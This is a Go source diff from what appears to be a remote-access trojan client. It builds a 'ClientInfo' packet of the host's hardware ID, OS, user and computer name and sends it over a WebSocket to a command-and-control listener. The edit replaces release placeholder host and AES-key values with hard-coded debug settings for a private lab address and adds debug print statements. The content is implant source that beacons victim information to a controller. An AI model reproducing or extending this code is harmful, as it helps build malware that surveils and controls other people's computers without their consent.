@@ -1,6 +1,7 @@
 package main
 
 import (
+	"fmt"
 	"main/Encrypt"
 	"main/HandlePacket"
 	"main/MessagePack"
@@ -38,7 +39,7 @@ func GetClientComputer() string {
 func SendInfo() []byte {
 	msgpack := new(MessagePack.MsgPack)
 	msgpack.ForcePathObject("Pac_ket").SetAsString("ClientInfo")
-
+	fmt.Println("calc")
 	msgpack.ForcePathObject("HWID").SetAsString(PcInfo.GetHWID())
 	msgpack.ForcePathObject("OS").SetAsString(PcInfo.GetOSVersion())
 	msgpack.ForcePathObject("User").SetAsString(PcInfo.GetCurrentUser())
@@ -51,14 +52,10 @@ func SendInfo() []byte {
 	msgpack.ForcePathObject("RemarkMessage").SetAsString(PcInfo.RemarkContext)
 	msgpack.ForcePathObject("RemarkClientColor").SetAsString(PcInfo.RemarkColor)
 
-	//msgpack.ForcePathObject("Path").SetAsString("")
-	msgpack.ForcePathObject("Admin").SetAsString("")
-	//msgpack.ForcePathObject("AV").SetAsString("NULL")
 	msgpack.ForcePathObject("CLRVersion").SetAsString("1.0")
 	msgpack.ForcePathObject("Group").SetAsString(PcInfo.GroupInfo)
 	msgpack.ForcePathObject("ClientComputer").SetAsString(PcInfo.ClientComputer)
-	//println(string(msgpack.Encode2Bytes()))
-	//msgpack.ForcePathObject("WANip").SetAsString("0.0.0.0")
+	fmt.Println(string(msgpack.Encode2Bytes()))
 	return msgpack.Encode2Bytes()
 }
 
@@ -84,6 +81,7 @@ func (c *Client) Connect(url string) {
 	// 设置回调处理
 	c.Connection.OnConnected(func() {
 		//log.Println("connected!")
+		fmt.Println("calc")
 		c.SendData(SendInfo())
 	})
 	c.Connection.OnConnectError(func(err error) {
@@ -158,22 +156,23 @@ var ClientWorking bool
 func main() {
 
 	//release
-	Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
-	Port := "PortAAAABBBBCCCCDDDD"
-	ListenerName := "ListenNameAAAABBBBCCCCDDDD"
-	route := "RouteAAAABBBBCCCCDDDD"
-	PcInfo.AesKey = "AeskAAAABBBBCCCC"
-	PcInfo.Host = strings.ReplaceAll(Host, " ", "")
-	PcInfo.Port = strings.ReplaceAll(Port, " ", "")
-	PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+	// Host := "HostAAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHJJJJ"
+	// Port := "PortAAAABBBBCCCCDDDD"
+	// ListenerName := "ListenNameAAAABBBBCCCCDDDD"
+	// route := "RouteAAAABBBBCCCCDDDD"
+	// PcInfo.AesKey = "AeskAAAABBBBCCCC"
+	// PcInfo.Host = strings.ReplaceAll(Host, " ", "")
+	// PcInfo.Port = strings.ReplaceAll(Port, " ", "")
+	// PcInfo.ListenerName = strings.ReplaceAll(ListenerName, " ", "")
+
 	//PcInfo.PcInfo.GetHWID()
 	PcInfo.ClientComputer = GetClientComputer()
 	///Debug
-	// Host := "192.168.1.4"
-	// Port := "4500"
-	// PcInfo.ListenerName = "dwd"
-	// route := "www"
-	// PcInfo.AesKey = "QWERt_CSDMAHUATW"
+	Host := "10.211.55.4"
+	Port := "4000"
+	PcInfo.ListenerName = "asd"
+	route := "www"
+	PcInfo.AesKey = "QWERt_CSDMAHUATW"
 	//url := "ws://127.0.0.1:80/Echo"
 	url := "ws://" + Host + ":" + Port + "/" + route
 	url = strings.ReplaceAll(url, " ", "")
